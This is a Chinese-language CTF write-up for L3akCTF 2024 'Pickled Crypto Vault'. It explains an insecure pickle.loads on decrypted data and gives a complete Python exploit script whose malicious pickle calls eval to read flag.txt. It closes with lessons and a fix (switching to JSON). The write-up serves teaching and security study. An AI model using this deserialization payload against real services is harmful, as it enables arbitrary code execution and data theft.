# L3akCTF 2024 Pickled Crypto Vault Writeup

## 题目简述

API 允许用户注册、上传自己的 RSA 公私钥、用任意公钥加密数据，再用账户中保存的私钥解密。解密端在 RSA-OAEP 解密成功后直接执行：

```python
jsonsafe_plaintext = pickle.loads(decrypted_data)
```

`pickle` 不是安全的数据交换格式，反序列化过程可以调用任意 Python 可调用对象。RSA 与 AES 只保证数据的加密属性，并不能把攻击者自己构造、自己加密的 pickle 变成可信数据。

## 解题过程

利用链中的密码操作全部由正常 API 完成：

1. 注册账户并取得 JWT。
2. 生成自己的 RSA 密钥对，上传公钥和私钥。
3. 构造恶意 pickle，把它作为普通明文提交给 `/encrypt`。
4. 将返回的 RSA-OAEP 密文提交给 `/decrypt`。
5. 服务端用刚上传的私钥解密，然后调用 `pickle.loads`。

不需要反弹 Shell。让 pickle 调用 `eval` 读取 `flag.txt`，返回值是普通字符串，Flask-RESTful 会直接把它放入 JSON 响应：

```python
import base64
import pickle
import secrets

import requests
from Crypto.PublicKey import RSA

base_url = "http://target/apiv1"
username = f"user_{secrets.token_hex(4)}"
password = "password1"


def b64(data):
    return base64.urlsafe_b64encode(data).decode()


class ReadFlag:
    def __reduce__(self):
        expression = "open('flag.txt').read()"
        return eval, (expression,)


# 生成攻击者完全控制的密钥对。
key = RSA.generate(2048)
private_key = key.export_key()
public_key = key.publickey().export_key()

# 注册并取得原始 JWT；Authorization 头不带 Bearer 前缀。
response = requests.post(
    f"{base_url}/register",
    json={
        "username": username,
        "password": password,
    },
)
response.raise_for_status()
token = response.json()["token"]
headers = {"Authorization": token}

# 服务端用 SHA-256(password) 派生的 AES key 保存私钥。
response = requests.post(
    f"{base_url}/uploadkey",
    headers=headers,
    json={
        "public_key": b64(public_key),
        "private_key": b64(private_key),
        "password": password,
    },
)
response.raise_for_status()

# 让正常加密接口用我们的公钥封装恶意 pickle。
malicious_pickle = pickle.dumps(ReadFlag())
response = requests.post(
    f"{base_url}/encrypt",
    headers=headers,
    json={
        "data": b64(malicious_pickle),
        "public_key": b64(public_key),
        "password": password,
    },
)
response.raise_for_status()
ciphertext = response.json()["encrypted_data"]

# 解密后立即触发 pickle.loads。
response = requests.post(
    f"{base_url}/decrypt",
    headers=headers,
    json={
        "encrypted_data": ciphertext,
        "password": password,
    },
)
response.raise_for_status()
print(response.json()["decrypted_data"])
```

反序列化时，`ReadFlag.__reduce__` 指定的 `eval` 被调用，表达式返回文件内容。响应为：

```text
L3AK{e75bebe920f1c6da062b68c056135c65}
```

## 方法总结

- `pickle.loads` 会执行对象的重建指令，只能处理完全可信来源的数据；加密并不等于认证来源。
- 本题的攻击者能够选择明文、公钥和对应私钥，所以 RSA-OAEP 只是把恶意 pickle 原样送到危险函数前。
- 用返回字符串的最小载荷可直接在 JSON 中取得 flag，比反弹 Shell 或外部回连更短、更稳定。
- 正确修复是改用 JSON 等纯数据格式，并在业务层验证结构；不能靠在 pickle 外再包一层 AES 或 RSA 解决代码执行风险。
